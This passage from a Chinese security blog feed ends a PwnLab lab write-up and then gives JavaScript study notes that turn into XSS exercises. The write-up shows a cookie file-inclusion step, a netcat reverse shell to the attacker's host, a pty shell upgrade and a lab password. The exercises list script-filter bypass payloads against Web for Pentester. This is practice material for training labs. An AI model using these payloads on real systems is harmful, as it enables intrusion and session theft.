class="code"><pre><span class="line"><span class="string">".jpg"</span>,<span class="string">".jpeg"</span>,<span class="string">".gif"</span>,<span class="string">".png"</span></span><br></pre></td></tr></table></figure><p>不仅如此，还检查类型是否为下面类型其中之一。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">image</span>/gif，<span class="built_in">image</span>/jpeg，<span class="built_in">image</span>/jpg，<span class="built_in">image</span>/png</span><br></pre></td></tr></table></figure><p>照片URL：<a href="http://192.168.43.18/upload/bc353652def6dad733344460a949eb04.png" target="_blank" rel="noopener">http://192.168.43.18/upload/bc353652def6dad733344460a949eb04.png</a></p><p>设置cookie:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">lang</span>=../upload/<span class="number">32</span>d3ca5e23f4ccf1e4c8660c40e75f33.png</span><br></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># nc -nvlp 3338</span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://192.168.43.18/?cmd=nc<span class="number">%20</span>-nv<span class="number">%20192</span>.168.43.249<span class="number">%203338</span><span class="number">%20</span>-e<span class="number">%20</span>/bin/bash</span><br></pre></td></tr></table></figure><p>提权：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty; pty.spawn("/bin/bash");'</span><br></pre></td></tr></table></figure><p>登录kane,密码：iSv5Ym2GRo，</p><p>cd /home/kane</p><p>ls -al</p><p>file msgmike</p><p>w</p><p>./msgmike</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//Multilingual. Not implemented yet.</span></span></span><br><span class="line"><span class="php"><span class="comment">//setcookie("lang","en.lang.php");</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lang'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"lang/"</span>.$_COOKIE[<span class="string">'lang'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Not implemented yet.</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>PwnLab Intranet Image Hosting<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure></body></html>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一、探测ip&lt;/p&gt;
&lt;p&gt;netdicover -i eth0&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://blog.ydq6.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="靶机" scheme="http://blog.ydq6.com/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="web" scheme="http://blog.ydq6.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>JS学习</title>
    <link href="http://blog.ydq6.com/web/JS%E5%AD%A6%E4%B9%A0/"/>
    <id>http://blog.ydq6.com/web/JS%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-05-06T14:55:49.000Z</published>
    <updated>2020-05-06T15:16:25.488Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为笔者有一定js基础，所以只对一些js忘了的知识和重要难点进行记录以及做了一些与JS有关的XSS实战。</p><a id="more"></a><h2 id="第一章-知识"><a href="#第一章-知识" class="headerlink" title="第一章 知识"></a>第一章 知识</h2><h3 id="1、实现"><a href="#1、实现" class="headerlink" title="1、实现"></a>1、实现</h3><p>（1）要在html中插入js,必须用script标签。浏览器会将script标签中的内容解释为脚本，不会解释为html语言。</p><p>（2）通常把js函数放置到head部分或者body底部，或者把脚本放到外部文件中，用.js命名，在head中用link标签引入脚本或者在标签script中用src引入。</p><h3 id="2、HTML-DOM-文档对象模型"><a href="#2、HTML-DOM-文档对象模型" class="headerlink" title="2、HTML DOM(文档对象模型)"></a>2、HTML DOM(文档对象模型)</h3><p>介绍：可编程对象模型，js能改变页面中所有的html元素和属性、CSS样式，对页面中所有事件作出响应</p><h4 id="2-1、查找html元素"><a href="#2-1、查找html元素" class="headerlink" title="2.1、查找html元素"></a>2.1、查找html元素</h4><p>（1）通过id</p><p>​    document.getElementById()</p><p>（2）通过标签名</p><p>​    document.getElementById().getElementsByTagName()</p><p>（3）通过类名</p><h4 id="2-2、改变HTML"><a href="#2-2、改变HTML" class="headerlink" title="2.2、改变HTML"></a>2.2、改变HTML</h4><p>（1）改变HTML输出流</p><p>​    document.write()</p><p>​    [注]文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。</p><p>   (2)改变html内容</p><p>​    document.getElementById().innerHTML</p><p>（3）改变HTML属性</p><p>​    document.getElementById().attribute</p><h4 id="2-3、改变HTML样式"><a href="#2-3、改变HTML样式" class="headerlink" title="2.3、改变HTML样式"></a>2.3、改变HTML样式</h4><p>​    document.getElementById().style.property</p><h4 id="2-4、DOM事件响应"><a href="#2-4、DOM事件响应" class="headerlink" title="2.4、DOM事件响应"></a>2.4、DOM事件响应</h4><p>​    事件：onclick=””</p><p>​    document.getElementById().onclick=</p><h4 id="2-5、改变节点"><a href="#2-5、改变节点" class="headerlink" title="2.5、改变节点"></a>2.5、改变节点</h4><p>（1）增加元素</p><p>​    如需向 HTML DOM 添加新元素，必须首先创建该元素（元素节点），然后向一个已存在的元素追加该元素。</p><p>​    创建元素：document.createElement()</p><p>​    创建文本节点：document.createTextNode()</p><p>​    追加元素：document.getElementById().appendChild()</p><p>（2）删除元素</p><p>​    如需删除 HTML 元素，必须首先获得该元素的父元素。</p><p>​    删除元素：document.getElementById().removeChild()</p><p>​        或 document.getElementById.parentNode.removeChild()</p><h3 id="3、重要语法"><a href="#3、重要语法" class="headerlink" title="3、重要语法"></a>3、重要语法</h3><p>（1）js语句最后要用分号</p><p>（2）js对大小写敏感</p><p>（3）js会忽略多余的空格</p><p>（4）注释：//或/* */</p><p>（5）用var关键词声明变量，变量拥有动态类型</p><h3 id="4、数组"><a href="#4、数组" class="headerlink" title="4、数组"></a>4、数组</h3><p>下标从0开始，三种表示方法：</p><p>（1）var arrays = new Array();</p><p>​    arrays[index];</p><p>（2）var arrays = new Array(“”,””,””);</p><p>（3）var arrays =[“”,””,””];</p><h3 id="5、字符串"><a href="#5、字符串" class="headerlink" title="5、字符串"></a>5、字符串</h3><p>5.1、常用方法：</p><p>（1）new String()创建</p><p>（2）indexOf() 检索字符串</p><p>（3）lastIndexOf()从后向前检索字符串</p><p>（4）replace()替换与正则表达式匹配的子串</p><p>（5）substr()从起始索引号提取字符串中指定数目的字符</p><p>（6）split()把字符串分割为字符串数组</p><p>5.2、常用属性</p><p>（1）length 长度</p><p>（2）prototype</p><h3 id="6、正则表达式"><a href="#6、正则表达式" class="headerlink" title="6、正则表达式"></a>6、正则表达式</h3><p>RegExp</p><h4 id="6-1、定义正则表达式"><a href="#6-1、定义正则表达式" class="headerlink" title="6.1、定义正则表达式"></a>6.1、定义正则表达式</h4><p>​    new RegExp(pattern,attributes);</p><p>​    var patt = new RegExp(“A”);</p><p>attribute:</p><table><thead><tr><th>attribute</th><th>描述</th></tr></thead><tbody><tr><td>i</td><td>执行对大小写不敏感匹配</td></tr><tr><td>g</td><td>执行全局匹配（查找所有匹配）</td></tr><tr><td>m</td><td>执行多行匹配</td></tr></tbody></table><h4 id="6-2、方法"><a href="#6-2、方法" class="headerlink" title="6.2、方法"></a>6.2、方法</h4><p>​    test(B)检索字符串B中是否存在与A匹配的,返回true或者false</p><p>​    exec(C)检索字符串C中是否存在与A匹配的，返回值是与A匹配的值</p><p>​    compile()改变检索模式或者添加/删除第二个参数。</p><h4 id="6-3、方括号"><a href="#6-3、方括号" class="headerlink" title="6.3、方括号"></a>6.3、方括号</h4><ul><li>用于查找某个范围内的字符</li><li>[abc]查找方括号之间的任何字符</li><li>[^abc]查找任何不在方括号之间的字符</li><li>[0-9]查找任何从0至9的数字</li><li>[a-z]查找从a到z的字符</li><li>[A-z]查找从A到z的字符 //注意A的ASCII码比a的小</li></ul><h4 id="6-4、量词"><a href="#6-4、量词" class="headerlink" title="6.4、量词"></a>6.4、量词</h4><ul><li>n+ 匹配任何包含至少一个n的字符串</li><li>n*匹配任何包含零个或多个n的字符串</li><li>n?匹配任何包含零个或一个n的字符串</li><li>^n匹配任何开头为n的字符串</li><li>n$匹配任何结尾为n的字符串</li></ul><h3 id="7、JS-windows"><a href="#7、JS-windows" class="headerlink" title="7、JS windows"></a>7、JS windows</h3><p>所有浏览器都支持 <em>window</em> 对象。它表示浏览器窗口。</p><p>所有 JavaScript 全局对象、函数以及变量均自动成为 window 对象的成员。</p><h4 id="7-1、浏览器窗口尺寸"><a href="#7-1、浏览器窗口尺寸" class="headerlink" title="7.1、浏览器窗口尺寸"></a>7.1、浏览器窗口尺寸</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> w=<span class="built_in">window</span>.innerWidth</span><br><span class="line">|| <span class="built_in">document</span>.documentElement.clientWidth</span><br><span class="line">|| <span class="built_in">document</span>.body.clientWidth;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> h=<span class="built_in">window</span>.innerHeight</span><br><span class="line">|| <span class="built_in">document</span>.documentElement.clientHeight</span><br><span class="line">|| <span class="built_in">document</span>.body.clientHeight;</span><br></pre></td></tr></table></figure><h4 id="7-2、screen对象"><a href="#7-2、screen对象" class="headerlink" title="7.2、screen对象"></a>7.2、screen对象</h4><p>包含有关用户屏幕的信息</p><p>availWidth可用的屏幕宽度</p><p>availHeight可用的屏幕高度</p><h4 id="7-3、location对象"><a href="#7-3、location对象" class="headerlink" title="7.3、location对象"></a>7.3、location对象</h4><p>location对象用于获得当前页面的地址 (URL)</p><p>（1）hostname返回web主机的域名</p><p>（2）pathname返回当前页面的路径和文件名</p><p>（3）port 返回web主机的端口</p><p>（4）protocol返回所使用的web协议</p><p>（5）assign()加载新文档</p><h4 id="7-4、Navigator对象"><a href="#7-4、Navigator对象" class="headerlink" title="7.4、Navigator对象"></a>7.4、Navigator对象</h4><p>该对象包含有关访问者浏览器的信息。</p><p>[注]来自 navigator 对象的信息具有误导性，不应该被用于检测浏览器版本，navigator数据可被浏览器使用者更改</p><p>（1）appCodeName 浏览器代码名</p><p>（2）appName 浏览器的名称</p><p>（3）appVersion 浏览器的平台和版本信息</p><p>（4）cookieEnabled浏览器是否启用cookie</p><p>（5）platform浏览器运行的操作系统平台</p><p>（6）userAgent客户机发送给服务器的user-agent头</p><p>（7）systemLanguage客户机指定的系统语言</p><h4 id="7-5、windows对象"><a href="#7-5、windows对象" class="headerlink" title="7.5、windows对象"></a>7.5、windows对象</h4><p>（1）location </p><p>（2）name 设置或返回窗口的名称</p><p>（3）status设置窗口状态栏的文本</p><p>（4）close()关闭浏览器窗口</p><p>（5）alert()弹出警告框</p><p>（6）confirm()弹出确认框</p><p>（7）prompt()弹出输入框</p><p>（8）open(“URL”,”窗口名称”,”窗口风格”) 打开一个新窗口</p><h3 id="8、函数"><a href="#8、函数" class="headerlink" title="8、函数"></a>8、函数</h3><h4 id="8-1、定义声明"><a href="#8-1、定义声明" class="headerlink" title="8.1、定义声明"></a>8.1、定义声明</h4><p>函数声明：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="keyword">function</span><span class="constructor">Name(<span class="params">parameters</span>)</span>&#123;</span><br><span class="line"><span class="comment">//code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数表达式：</p><p>JavaScript 函数可以通过一个表达式定义，函数表达式可以存储在变量中。在函数表达式存储在变量后，变量也可作为一个函数使用：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="function"><span class="keyword">function</span><span class="params">(parameters)</span></span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> z = x(parameters);</span><br></pre></td></tr></table></figure><p>function构造函数</p><p>函数同样可以通过内置的 JavaScript 函数构造器（Function()）定义。</p><h4 id="8-2、参数"><a href="#8-2、参数" class="headerlink" title="8.2、参数"></a>8.2、参数</h4><p>参数规则：</p><p>函数定义时参数没有指定数据类型</p><p>如果函数在调用时缺少参数，参数会默认设置为undefined</p><p>js函数参数是值传递，对象是引用传递。</p><p>Arguments对象</p><p>js函数都有个内置的对象arguments。该对象包含了函数调用的参数数组。</p><h4 id="8-3、调用"><a href="#8-3、调用" class="headerlink" title="8.3、调用"></a>8.3、调用</h4><p>this关键字指向函数执行时的当前对象。</p><p>当函数没有被自身的对象调用时， <strong>this</strong> 的值就会变成全局对象，全局变量属于windows对象。如果函数是对象中的一个方法时，this的值就会变为对象。</p><h4 id="8-4、闭包"><a href="#8-4、闭包" class="headerlink" title="8.4、闭包"></a>8.4、闭包</h4><p>函数既可以访问该函数内部定义的变量又可访问该函数外部定义的变量。</p><p>全局变量的作用域是全局性的，局部变量只能用于定义它函数内部。</p><p>内嵌函数plus可以访问父函数的变量而不是访问当前函数的变量（用在父函数和当前函数有同名变量时）</p><h2 id="第二章-实战"><a href="#第二章-实战" class="headerlink" title="第二章 实战"></a>第二章 实战</h2><h3 id="1、XSS（跨站脚本攻击）"><a href="#1、XSS（跨站脚本攻击）" class="headerlink" title="1、XSS（跨站脚本攻击）"></a>1、XSS（跨站脚本攻击）</h3><h4 id="1-1、实验环境"><a href="#1-1、实验环境" class="headerlink" title="1.1、实验环境"></a>1.1、实验环境</h4><p>虚拟机：web for pentester</p><p>iso下载地址</p><p><a href="https://pentesterlab.com/exercises/web_for_pentester/iso" target="_blank" rel="noopener">https://pentesterlab.com/exercises/web_for_pentester/iso</a></p><h4 id="1-2、第一关"><a href="#1-2、第一关" class="headerlink" title="1.2、第一关"></a>1.2、第一关</h4><p><a href="http://192.168.1.114/xss/example1.php?name=hacker" target="_blank" rel="noopener">http://192.168.1.114/xss/example1.php?name=hacker</a></p><p><img src="/assets/image-20180531165807632.png" alt="image-20180531165807632"></p><p>可以看出是将name的参数显示在屏幕上。</p><p>用js语言alert(‘flag’)直接弹出flag</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example1.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>直接弹出flag</p><h4 id="1-3、第二关"><a href="#1-3、第二关" class="headerlink" title="1.3、第二关"></a>1.3、第二关</h4><p>先继续尝试alert(‘flag’)</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example2.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>发现不弹框，应该script标签被过滤</p><p>回顾基础知识，html的标签对大小写不敏感</p><p>尝试用</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example2.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>正确弹框</p><h4 id="1-4、第三关"><a href="#1-4、第三关" class="headerlink" title="1.4、第三关"></a>1.4、第三关</h4><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example3.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20180531172849293.png" alt="image-20180531172849293"></p><p>没用，看来大小写均被过滤了。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example3.php?name=hackerscript</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20180531172939247.png" alt="image-20180531172939247"></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example3.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20180531173008402.png" alt="image-20180531173008402"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example3.php?name=hacker&lt;script1&gt;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20180531173119142.png" alt="image-20180531173119142"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example3.php?name=hacker&lt;<span class="number">1</span>script1&gt;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20180531173157502.png" alt="image-20180531173157502"></p><p>猜想可能是基于&lt;script前缀为匹配的，</p><p>用下面方法：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example3.php<span class="built_in">?name</span>=&lt;scri<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">pt&gt;alert(<span class="string">"flag"</span>)&lt;/sc</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>ript&gt;</span><br></pre></td></tr></table></figure><p>过滤掉了script后生下来的字符组成script，成功绕过。</p><h4 id="1-5、第四关"><a href="#1-5、第四关" class="headerlink" title="1.5、第四关"></a>1.5、第四关</h4><p>继续输入</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example4.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>没弹框，再次过滤了。</p><p>而且显示：</p><p><img src="/assets/image-20180531223835636.png" alt="image-20180531223835636"></p><p>试一下其他的：</p><p><a href="http://192.168.1.114/xss/example4.php?name=script" target="_blank" rel="noopener">http://192.168.1.114/xss/example4.php?name=script</a></p><p>又报error，其他字符则正常显示，看来是出现script字符就会爆报error</p><p>换一下其他标签试试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example4.php?name=&lt;img src=<span class="string">"112321312"</span> onerror=<span class="string">'alert('</span>flag<span class="string">')'</span><span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure><p>不能弹出，为什么呢？想一下是单引号中里面还有单引号，语法错误。</p><p>换为：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example4.php?name=&lt;img src=<span class="string">"112321312"</span> onerror=<span class="string">"alert('flag')"</span><span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure><p>成功弹出，看来只是对script报错</p><h4 id="1-6、第五关"><a href="#1-6、第五关" class="headerlink" title="1.6、第五关"></a>1.6、第五关</h4><p>试下普通的</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20180531225745419.png" alt="image-20180531225745419"></p><p>又报错。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example5.php?name=&lt;img src=<span class="string">"112321312"</span> onerror=<span class="string">"alert('flag')"</span><span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure><p>也报错。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example5.php?name=&lt;img src=<span class="string">"112321312"</span> <span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20180531230254166.png" alt="image-20180531230254166"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example5.php?name=script</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20180531225902413.png" alt="image-20180531225902413"></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span></span><br></pre></td></tr></table></figure><p>先前猜是基于标签过滤的，后来发现并不是，只是正好前面测试的两个都含有alert关键词而已。根据后面几种结果猜想可能是基于alert关键词报错。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example5.php?name=alert</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20180531230641775.png" alt="image-20180531230641775"></p><p>猜想正确，所以只需换个关键词应该就可以了。</p><p>换为confirm试试</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">confirm(<span class="string">"flag"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20180531230929514.png" alt="image-20180531230929514"></p><p>成功弹出。</p><p>再试试用编码是否可以绕过alert关键词检测</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example<span class="number">5</span>.php?name=&lt;script&gt;<span class="symbol">%61</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%65</span><span class="symbol">%72</span><span class="symbol">%74</span>(<span class="string">"flag"</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20180531231029514.png" alt="image-20180531231029514"></p><p>报错，证明URL编码不能绕过。</p><p>换下其他的</p><p>用echo+String.fromCharCode()</p><p>echo()函数可以计算某个字符串并执行其中的代码</p><p>String.fromCharCode()可接收一个指定的Unicode值，然后返回一个字符串</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>)+<span class="string">"('flag')"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>没报错，但是不弹框，为什么呢？看下源代码</p><p><img src="/assets/image-20180601000225847.png" alt="image-20180601000225847"></p><p>+号怎么变成了空格呢？</p><p>用URL编码试试</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>)%<span class="number">2</span>b<span class="string">"('flag')"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>成功弹框</p><h4 id="1-7、第六关"><a href="#1-7、第六关" class="headerlink" title="1.7、第六关"></a>1.7、第六关</h4><p><img src="/assets/image-20180601143017232.png" alt="image-20180601143017232"></p><p>这次屏幕连hacker都不显示了。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">200.106</span>/xss/example6.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>不报错也不弹框,显示</p><p><img src="/assets/image-20180601142057853.png" alt="image-20180601142057853"></p><p>为什么显示”;呢？很奇怪。试探下是什么原因造成”;的</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.200.106/xss</span><span class="regexp">/example6.php?name=&lt;script&gt; #没有</span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/192.168.200.106/xss</span><span class="regexp">/example6.php?name=&lt;script&gt;&lt;/script</span>&gt; <span class="comment">#有";</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.200.106/xss</span><span class="regexp">/example6.php?name=&lt;/script</span>&gt;  <span class="comment">#有";</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.200.106/xss</span><span class="regexp">/example6.php?name=&lt;a&gt;&lt;/a</span>&gt;    <span class="comment">#没有</span></span><br></pre></td></tr></table></figure><p>看来只要有script就有”;</p><p>再在</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">200.106</span>/xss/example6.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p> 下开下源代码</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello </span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">var $a= 